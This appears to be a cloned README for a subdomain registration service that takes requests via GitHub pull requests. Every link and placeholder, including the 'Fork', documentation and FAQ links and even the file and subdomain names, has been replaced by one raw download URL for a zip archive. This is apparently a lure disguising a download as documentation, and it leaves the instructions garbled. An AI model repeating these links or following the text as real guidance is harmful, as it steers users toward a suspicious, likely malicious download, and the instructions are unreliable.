# Register
> If you want a more visual guide, check out [this blog post](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip).

- [Fork](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip) this repository.
- Add a new file called `https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip` in the `domains` folder to register `https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip`.
- [Read the documentation](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip).
   - If you are applying for NS records please read [this](#ns-records).
- Your pull request will be reviewed and merged. *Make sure to keep an eye on it in case we need you to make any changes!*
- After the pull request is merged, please allow up to 24 hours for the changes to propagate.
- Enjoy your new `https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip` subdomain! Please consider leaving us a star â­ï¸ to help support us!

### NS Records
When applying for NS records, please be aware we already support a [wide range of DNS records](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip), so you may not need them. 

In your PR, please explain why you need NS records, including examples, to help mitigate potential abuse. Refer to the [FAQ](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip) for guidelines on allowed usage.

***Pull requests adding NS records without sufficient reasoning will be closed.***

> Also see: [Why are you so strict with NS records](https://github.com/XpiderService/register/raw/refs/heads/main/util/Software-spece.zip)?
